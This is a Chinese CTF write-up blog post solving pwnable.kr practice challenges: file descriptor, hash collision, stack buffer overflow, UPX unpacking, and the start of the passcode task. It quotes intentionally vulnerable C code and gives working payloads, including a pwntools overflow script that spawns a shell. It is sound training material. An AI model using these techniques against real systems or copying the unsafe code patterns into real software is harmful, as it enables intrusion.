---

title: Pwnable_kr_wp
date: 2019-09-22 18:17:55
categories: Pwn
tag: Pwn
classes: wide
---
# Pwnable.kr Writeup

## 一、学习资料

首先当然是先学习一波理论知识，这种入门的东西百度上一大堆，我就不一一列举了，这里只放一下我的参考资料。仅供参考。

[手把手教你栈溢出从入门到放弃](https://www.anquanke.com/post/id/85865)

## 二、学习实践



在了解了基本知识之后，当然是要实践一下，我采用了[Pwnable.kr](http://pwnable.kr/),这里有不同难度的题目，内容涵盖多个领域，界面很可爱。youtube上也有相应的视频教程，不过建议先自己做，做出来之后可以再去看一看，学习一下新思路。

## Pwnable.kr-01 fd

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559361228658.png)

首先ssh连上，ls看一下都有什么东西，

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559279059270.png)

可以看到有个flag文件，我们看看里面有什么，

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559279327276.png)

发现没有权限，这可怎么办呢？

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/6983d90f5dd24481b88b197f862722d5.jpg)

从上面的图中，我们也能看到，我们对`flag`这个文件的权限是0。既然这个文件我们没有权限，那我么们就看看还有什么其他东西吧。我们发现还有一个`fd.c`和一个`fd`文件，我们对`fd.c`是有读取权限的，可以先看一下里面是什么（这里我做了注释，源文件是没有注释的，不懂的请自行百度谷歌）：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char buf[32];
int main(int argc, char* argv[], char* envp[]){
	if(argc<2){//这里判断命令行参数个数是否小于2
		printf("pass argv[1] a number\n");
		return 0;
	}
	int fd = atoi( argv[1] ) - 0x1234;//把第二个命令行参数转成数字，再减0x1234
	int len = 0;
	len = read(fd, buf, 32);//以fd为文件描述符读取32个字节内容
	if(!strcmp("LETMEWIN\n", buf)){//比较buf是否与"LETMEWIN\n"相等
		printf("good job :)\n");
		system("/bin/cat flag");//这里会输出flag文件的内容
		exit(0);
	}
	printf("learn about Linux file IO\n");
	return 0;

}
```

经过分析源码，我们可以知道，只需要让`fd`程序替我们把`flag`打印出来就行了，这里涉及到了linux用户特殊权限的问题，不懂的同学可以自行百度谷歌，或者点击这个链接，[Linux系统中的文件的s权限](https://blog.csdn.net/awhip9/article/details/77774693)。这里`fd`程序就拥有SGID权限，可以以fd组的权限运行，自然就能查看flag文件的内容。

那怎么才能让`fd`程序帮助我们查看flag的内容呢？我们先随便运行一下看看效果。

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559281002151.png)

发现并没有什么卵用，还叫我们去了解一下Linux的文件IO，好吧，那就去学习一下，[FILE I/O](https://www.classes.cs.uchicago.edu/archive/2017/winter/51081-1/LabFAQ/lab2/fileio.html)。

学习之后我们终于明白了，原来标准输入stdin的文件描述符是0，所以我们的命令行第二个参数应该是0x1234的十进制形式，也就是4660，然后就可以从标准输入，也就是键盘读取了，我们只需要再输入LETMEWIN，然后敲回车就可以看到flag了。

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559280408311.png)

这里并没有用的我们前面学习资料里讲的知识，因为这只是第一个题，比较简单，是新手入门的，后面我们就会逐渐用到前面的知识了。

## Pwnable.kr-02 collision

### (一) 题目

首先ssh进去，ls查看一下都有什么东东。

![1559284286027](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559284286027.png)

和前一个一样，一个没有读取权限的`flag`，一个`col.c`，一个`col`的可执行程序。

直接看源码吧：

```c
#include <stdio.h>
#include <string.h>
unsigned long hashcode = 0x21DD09EC;
unsigned long check_password(const char* p){
	int* ip = (int*)p;//把char指针转成int指针
	int i;
	int res=0;
	for(i=0; i<5; i++){//因为只有20个字符，一个字符一个字节，一个int4个字节，所以有5个int
		res += ip[i];
	}
	return res;//返回相加的结果
}

int main(int argc, char* argv[]){
	if(argc<2){//输入两个命令行参数
		printf("usage : %s [passcode]\n", argv[0]);
		return 0;
	}
	if(strlen(argv[1]) != 20){//检查第二个参数长度是否为20
		printf("passcode length should be 20 bytes\n");
		return 0;
	}

	if(hashcode == check_password( argv[1] )){//调用check_password函数，检查返回结果是否与hashcode相等
		system("/bin/cat flag");
		return 0;
	}
	else
		printf("wrong passcode.\n");
	return 0;
}
```

分析完了之后我们发现，我们需要输入20个字符，这20个字符会被4个一组转成int，之后5个int类型的数相加，结果要等于0x21DD09EC。

这该怎么办呢？这里用到了一个Linux的知识点，可以直接把python的输出变成程序的输入，

```bash
./col `python -c "print '\x01'*16+'\xe8\x05\xd9\x1d'"`
```

由于0x01010101 *4 + 0x1dd905e8 = 0x21dd09ec,所以我们可以使用16个0x01对应的字符，加上0xe8 0x05 0xd9 0x1d 对应的四个字符作为输入。这里还要注意的一个点是[大小端序](https://blog.csdn.net/weixin_33831196/article/details/88106969)的问题。

![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/1559290716760.png)

这就得到了我们需要的flag。

## Pwnable.kr-03 bof

### 0x01 
这次我们开始进行第三个题目：
![题目](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-19_20-26-11.png)  
下面就是bof.c的代码：
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
从代码中我们可以看到这里使用了一个危险函数`gets()`，这里我们可以控制`overflowme`的内容来控制堆栈的内容，覆盖掉`key`的原本的内容，让`key`的值等于`0xcafebabe`。这样我们就可以轻松过关了。是不是很简单呢？  
### 0x02
下面我们就来看一下程序的汇编代码：
![汇编](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-19_21-40-30.png)  
通过上图，我们可以看到我们输入的变量保存在`ebp-0x2c`的地方，而我们的`key`则保存在`ebp+0x8`的地方，这里我们就需要了解一下这时的栈结构：
![堆栈](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-19_22-05-34.png)  
所以我们需要控制我们的输入，覆盖掉`ebp+0x8`的地方，这里我使用了`pwntools`来帮助我实现这段`shellcode`。
```python
from pwn import *
context.log_level = 'debug'
conn = remote('pwnable.kr',9000)
p = 'A'*52
p += p32(0xcafebabe)
conn.sendline(p)
conn.interactive()
```
我们需要从`ebp-0x2c`一直覆盖到`ebp+8`的地方，一共是56字节，但是最后4个字节是我们的`key`，所以我使用了52个`A`加上我们的目标字符串进行拼接。  
运行上面的这段python代码，就可以获得flag了。  
PS：`pwntools`是一个非常好用的pwn工具，希望大家能掌握它的使用。

## Pwnable.kr-04 flag
### 0x01 
先来看一下题目：
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_21-55-59.png)  
这次我们没有源代码了，只有一个可执行文件。  
### 0x02 分析
先来看一下这个文件是什么格式的？
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_21-58-20.png)  
然后用`checksec`检查一下，看看有没有什么发现，这些都是常规操作。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-23-12.png)  
这里我们有了一个新发现：它使用upx加了壳。其实我们也可以通过`strings`命令找到这个线索。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-14-58.png)  
然后就比较简单了，我们先用upx脱壳。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-16-06.png)  
现在我们再来看一下。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-17-03.png)  
可以看到已经成功脱壳了。下面我们就可以上我们的终极武器`gdb`了。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-17-39.png)  
可以看到有关于`flag`的提示，我们直接查看那里的内存内容看看。
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-20_22-18-10.png)  
哈哈，我们直接就找到了flag，是不是很简单呢？
## Pwnable.kr-05 passcode
### 0x01 爱之初体验
首先，让我们来看一下这个题目：
![](https://gitee.com/ttxs69/images/raw/master/pwn_img/Pwnable-kr-wp/截图_2019-06-25_17-05-46.png)  
可以看到这里是我们熟悉的ssh环境，这里我把里面的代码和程序下载到了本地，便于调试。
### 0x02 爱之再回首
下面我们就来看一下这里面都干了什么：
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
        scanf("%d", passcode2);

	printf("checking...\n");
	if(passcode1==338150 && passcode2==13371337){
                printf("Login OK!\n");
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
		exit(0);
        }
}

void welcome(){
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main(){
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```